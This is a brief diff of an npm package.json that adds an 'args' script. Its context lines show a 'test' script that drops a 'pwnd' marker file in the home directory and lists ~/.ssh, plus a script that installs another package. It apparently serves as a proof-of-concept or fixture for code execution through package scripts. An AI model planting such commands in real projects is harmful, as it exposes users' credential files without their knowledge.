@@ -8,6 +8,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo pwnd > ~/uhavebeen && ls -la ~/uhavebeen ~/.ssh",
+    "args": "node index.js",
     "indirection": "npm i old-hd-keyring"
   },
   "dependencies": {
